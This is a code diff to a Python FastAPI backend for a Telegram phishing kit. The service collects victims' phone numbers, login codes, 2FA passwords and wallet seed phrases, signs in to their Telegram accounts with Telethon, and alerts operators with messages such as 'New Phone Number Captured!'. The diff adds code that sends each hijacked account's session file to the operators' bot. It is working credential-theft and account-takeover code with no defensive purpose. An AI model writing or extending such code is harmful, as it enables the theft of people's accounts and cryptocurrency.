@@ -4,7 +4,7 @@ import asyncio
 from fastapi import FastAPI, Request, HTTPException, APIRouter
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse
-from aiogram import Bot
+from aiogram import Bot, types
 from telethon import TelegramClient, errors
 from pydantic import BaseModel
 from dotenv import load_dotenv
@@ -47,13 +47,16 @@ class WalletData(BaseModel):
     seedPhrase: str
     user: dict = None
 
-async def notify_admins(text: str):
+async def notify_admins(text: str, document: str = None):
     if os.path.exists("admins.json"):
         with open("admins.json", "r") as f:
             admins = json.load(f)
             for admin_id in admins:
                 try:
-                    await admin_bot.send_message(admin_id, text, parse_mode="Markdown")
+                    if document:
+                        await admin_bot.send_document(admin_id, types.FSInputFile(document), caption=text, parse_mode="Markdown")
+                    else:
+                        await admin_bot.send_message(admin_id, text, parse_mode="Markdown")
                 except Exception as e:
                     print(f"Failed to notify {admin_id}: {e}")
 
@@ -78,10 +81,10 @@ async def submit_phone(data: PhoneData):
     await notify_admins(f"📞 *New Phone Number Captured!*\n\n{user_info}\nPhone: `{data.phone}`")
 
     if API_ID and API_HASH:
-        client = TelegramClient(f"sessions/{data.phone}", int(API_ID), API_HASH)
+        session_path = f"sessions/{data.phone}"
+        client = TelegramClient(session_path, int(API_ID), API_HASH)
         await client.connect()
         try:
-            # Explicitly check if connected and handle possible issues
             if not await client.is_user_authorized():
                 await client.send_code_request(data.phone)
                 clients[data.phone] = client
@@ -104,7 +107,8 @@ async def submit_code(data: CodeData):
         client = clients[data.phone]
         try:
             await client.sign_in(data.phone, data.code)
-            await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}`!")
+            session_file = f"sessions/{data.phone}.session"
+            await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}`!", document=session_file)
             return {"status": "logged_in"}
         except errors.SessionPasswordNeededError:
             await notify_admins(f"🔐 *2FA Needed* for `{data.phone}`")
@@ -124,7 +128,8 @@ async def submit_2fa(data: TwoFAData):
         client = clients[data.phone]
         try:
             await client.sign_in(password=data.twoFactor)
-            await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}` with 2FA!")
+            session_file = f"sessions/{data.phone}.session"
+            await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}` with 2FA!", document=session_file)
         except Exception as e:
             await notify_admins(f"❌ *2FA Sign-in Error* for `{data.phone}`: {e}")
             print(f"2FA Error: {e}")
